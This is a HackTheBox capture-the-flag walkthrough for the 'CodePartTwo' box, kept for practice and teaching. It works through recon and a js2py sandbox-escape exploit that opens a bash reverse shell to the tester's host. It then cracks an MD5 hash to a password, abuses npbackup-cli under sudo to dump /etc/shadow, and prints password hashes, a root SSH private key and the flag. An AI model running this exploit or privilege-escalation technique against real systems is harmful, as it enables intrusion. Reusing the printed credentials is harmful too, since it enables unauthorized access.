+++
title = "HTB Walkthrough: CodePartTwo"
date = "2025-11-22"
[taxonomies]
tags = ["cybersecurity", "HTB", "walkthrough", "penetration-testing"]
[extra]
toc = true
protected = true
retired_date = "2025-12-22"
password = "09cd485933fb29e34fefb7f5a9ea00d8"
+++

# HTB Walkthrough: CodePartTwo

![](codeparttwo.png)


| Name                     | CodePartTwo                                     |
|--------------------------|-------------------------------------------------|
| Location                 | https://app.hackthebox.com/machines/CodePartTwo |
| Difficulty               | Easy                                            |
| OS                       | Linux                                           |
| Concepts                 |                                                 |
| Points                   | 20                                              |
| Rating at time of pwning | 4.4                                             |
| Date pwnd                | 22nd Nov 2025                                   |

## Overview

Welcome back to another CTF write-up for practicing penetration testing and reporting skills!

Code Part Two is an easy level Ubuntu Linux box hosted on the hackthebox platform, hosting a developer centric website.

## My review: 4 stars

I enjoyed this box as it was simple and somewhat realistic - developer tooling has historically been a problematic area because of the need to run as administrator on workstations, and CI/CD tooling needing to allow remote arbitrary code excetion as a feature. Normally this would be a security flaw, so the owners of these tools need to be extremely careful about sandboxing the environment that allows untrusted input. I do deduct a star because the premise of the box is still reasonably contrived and this makes the foothold a little bit too easy in my opinion.


# Recon

## nmap scan
Port scanning the target with `nmap` showed two open TCP ports: 22 (SSH) & 8000 (HTTP)
```bash
seska@kali~: nmap -vv -Pn -T4 -sV -sC -p- -oN "/home/kali/htb/codeparttwo/scans/_quick_tcp_nmap.txt"

Nmap scan report for codeparttwo (10.129.232.59)
Host is up, received user-set (0.18s latency).
Scanned at 2025-11-21 10:04:50 EST for 435s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnwmWCXCzed9BzxaxS90h2iYyuDOrE2LkavbNeMlEUPvMpznuB9cs8CTnUenkaIA8RBb4mOfWGxAQ6a/nmKOea1FA6rfGG+fhOE/R1g8BkVoKGkpP1hR2XWbS3DWxJx3UUoKUDgFGSLsEDuW1C+ylg8UajGokSzK9NEg23WMpc6f+FORwJeHzOzsmjVktNrWeTOZthVkvQfqiDyB4bN0cTsv1mAp1jjbNnf/pALACTUmxgEemnTOsWk3Yt1fQkkT8IEQcOqqGQtSmOV9xbUmv6Y5ZoCAssWRYQ+JcR1vrzjoposAaMG8pjkUnXUN0KF/AtdXE37rGU0DLTO9+eAHXhvdujYukhwMp8GDi1fyZagAW+8YJb8uzeJBtkeMo0PFRIkKv4h/uy934gE0eJlnvnrnoYkKcXe+wUjnXBfJ/JhBlJvKtpLTgZwwlh95FJBiGLg5iiVaLB2v45vHTkpn5xo7AsUpW93Tkf+6ezP+1f3P7tiUlg3ostgHpHL5Z9478=
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBErhv1LbQSlbwl0ojaKls8F4eaTL4X4Uv6SYgH6Oe4Y+2qQddG0eQetFslxNF8dma6FK2YGcSZpICHKuY+ERh9c=
|   256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEJovaecM3DB4YxWK2pI7sTAv9PrxTbpLG2k97nMp+FM
8000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: gunicorn/20.0.4
|_http-title: Welcome to CodePartTwo
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/21%OT=22%CT=1%CU=32752%PV=Y%DS=2%DC=T%G=Y%TM=692081
OS:45%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)OPS(O1=
OS:M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7
OS:%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y
OS:%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD
OS:=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%D
OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O
OS:=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK
OS:=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 18.748 days (since Sun Nov  2 16:14:16 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   178.44 ms 10.10.14.1
2   178.56 ms codeparttwo (10.129.232.59)


```
## Port 22 (SSH 8.2p1)
The SSH server is configured with some old and insecure algorithms. This can be assessed by `ssh-audit` however this isn't a particularly relevant finding initially. However this is still report worthy.

```bash
ssh-audit codeparttwo
# general
(gen) banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13
(gen) software: OpenSSH 8.2p1
(gen) compatibility: OpenSSH 7.4+, Dropbear SSH 2020.79+
(gen) compression: enabled (zlib@openssh.com)

<SNIP>

# algorithm recommendations (for OpenSSH 8.2)
(rec) -ecdh-sha2-nistp256                   -- kex algorithm to remove
(rec) -ecdh-sha2-nistp384                   -- kex algorithm to remove
(rec) -ecdh-sha2-nistp521                   -- kex algorithm to remove
(rec) -ecdsa-sha2-nistp256                  -- key algorithm to remove
(rec) -hmac-sha1                            -- mac algorithm to remove
(rec) -hmac-sha1-etm@openssh.com            -- mac algorithm to remove
(rec) -ssh-rsa                              -- key algorithm to remove
(rec) -diffie-hellman-group14-sha256        -- kex algorithm to remove
(rec) -hmac-sha2-256                        -- mac algorithm to remove
(rec) -hmac-sha2-512                        -- mac algorithm to remove
(rec) -umac-128@openssh.com                 -- mac algorithm to remove
(rec) -umac-64-etm@openssh.com              -- mac algorithm to remove
(rec) -umac-64@openssh.com                  -- mac algorithm to remove

<SNIP>
```

## Port 8000 (HTTP - Gunicorn/20.0.4)
The web application running on port 8000 does look promising for exploitation: the website source is downloadable and it appears that a registered user can simply run arbitrary javascript in the browser.

![](codeparttwo-port-8000.png)
### Source code analysis
The source supplied shows a flask 3.0.3 application and an app secret in the source code:

```python
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import hashlib
import js2py
import os
import json

js2py.disable_pyimport()
app = Flask(__name__)
app.secret_key = 'S3cr3tK3yC0d3PartTw0'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)
```

The code that runs when the 'Run Code' button is pressed appears to use `js2py` to handle the javascript evaluation via python, executing it server side, and finally bringing back the result as the HTTP response.

This input is largely unsanitized both in and out of the application, giving us rise to consider server side command execution vulnerabilities. XSS is a consideration, although that is complicated by the fact that the result is converted to JSON first. Since the version of `js2py` is reported as 0.74 in `requirements.txt` it is possible that it is vulnerable to CVE-2024-28397 - a sanbox escape.

```python
@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})

```
There is a publicly available exploit example on [github](https://github.com/releaseown/exploit-js2py/blob/11203e63de577d251271b25911ffdff5cdf050c4/exploit_js2py.php#L108) that we can modify and use to gain a foothold on the webserver.


```exploit.js
let command = "bash -c 'bash -i >& /dev/tcp/10.10.14.19/4242 0>&1'"
let hacked, bymarve, n11
let getattr, obj

base = '__base__'
getattribute = '__getattribute__'
hacked = Object.getOwnPropertyNames({})
bymarve = hacked[getattribute]
n11 = bymarve("__getattribute__")
obj = n11("__class__")[base]
getattr = obj[getattribute]
sub_class = '__subclasses__';

function findpopen(o) {
    let result;
    for(let i in o[sub_class]()) {
        let item = o[sub_class]()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(command, -1, null, -1, -1, -1, null, null, true).communicate()
```

By setting up a listener and running this in the browser, we gain a foothold as username `app`.
```bash
seska@kali~$ nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.10.14.19] from (UNKNOWN) [10.129.232.59] 40176
bash: cannot set terminal process group (922): Inappropriate ioctl for device
bash: no job control in this shell
app@codeparttwo:~/app$ id
id
uid=1001(app) gid=1001(app) groups=1001(app)
app@codeparttwo:~/app$
```

# Enumeration

A quick `cat /etc/passwd` shows us that there is `root`, `app` and `marco` as shelled users on the box. We don't have access to marco's files so we either need to escalate our privileges to root or marco in order to solve this box.

The `/home/app/app/instance` directory houses the users.db file that we can exfiltrate and inspect offline. It is a SQLite 3.x database. Kali comes with sqlitebrowser, that gives us a GUI way to browse its contents, and its in the `users` table where we can find the password hash for the user `marco`.

![](codeparttwo-sqlite.png)

These are raw MD5 hashes and the `marco` hash is vulnerable to a dictionary attack using `john`
```bash
seska@kali~$ john ./hashes.txt --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetangelbabylove (marco)
```

# Foothold 1
By using the username `marco` and password `sweetangelbabylove` we're able to login via SSH as marco and get the first flag for the foothold!

# Privilege Escalation

Inspecting the sudoers with `sudo -l` shows that marco can run a backup utility called `npbackup-cli` with sudo, making this a possible privesc vulnerability if we can force this tool to do our bidding.

```bash
marco@codeparttwo:~$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

## LoLbin: npbackup-cli

As luck would have it, there is a misconfiguration based privilege escalation proof of concept on [github](https://github.com/AliElKhatteb/npbackup-cli-priv-escalation). By uploading and modifying this file we can read the root flag or the shadow file.

```bash
marco@codeparttwo:/tmp$ sudo npbackup-cli -c ./backup.cfg --backup
2025-11-21 16:47:32,929 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent
<SNIP>

processed 1 files, 1.339 KiB in 0:00
snapshot 763308b2 saved
<SNIP>
```

And following up with this command to dump the backup we saved as root.
```bash
marco@codeparttwo:/tmp$ sudo /usr/local/bin/npbackup-cli -c npbackup.conf --dump /etc/shadow --snapshot-id 763308b2
{"result": false, "reason": "Config file npbackup.conf cannot be read or does not exist"}
marco@codeparttwo:/tmp$ sudo /usr/local/bin/npbackup-cli -c ./backup.cfg --dump /etc/shadow --snapshot-id 763308b2
root:$6$UM1RuabUYlt5BQ5q$ZtzAfYOaCaFxA8MGbyH1hegFpzQmJrpIkx7vEIKvXoVl830AXAx1Hgh8r11GlpXgY25LK8wF76nvQYQ1wLSn71:20104:0:99999:7:::
<SNIP>
marco:$6$i5xRI7UVqeBITIby$NQKHXVvAWz7Vl3QkEwgxw0ItF9Lwen4gGCBi.YYiDQTdkgcPABaqfmBzheAM/9JA/9J7szqDzPaIDbkNqc.0V.:20022:0:99999:7:::
app:$6$5iH3Zik78QR8t9Se$bgRAig/YjbMzwOTFME629sLrrTn2avVD9pLFwz0X2zBTz0LYfNIEuw6w5s53NNu2K7IeEJK4D6j9PB6SR.UvC0:20022:0:99999:7:::
```

# Root Access


The above root hash wasn't easily crackable with `john` and `rockyou.txt` so I just used the above approach to read out `/root/root.txt` to yield the flag: `09cd485933fb29e34fefb7f5a9ea00d8` which is a shortcut.

However, it should be noted that the following private key is stored in `/root/.ssh/id_rsa` which can be used to login as the root account.

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

This key is passwordless, and allows immediate SSH access to the flag.

```bash
seska@kali~$ ssh root@codeparttwo -i ./root.key
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri 21 Nov 2025 05:11:44 PM UTC

  System load:           0.2
  Usage of /:            58.7% of 5.08GB
  Memory usage:          33%
  Swap usage:            0%
  Processes:             243
  Users logged in:       0
  IPv4 address for eth0: 10.129.232.59
  IPv6 address for eth0: dead:beef::250:56ff:fe95:317b


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Nov 21 17:11:44 2025 from 10.10.14.19
root@codeparttwo:~# cat root.txt
09cd485933fb29e34fefb7f5a9ea00d8
```
![](codeparttwo-pwnd.png)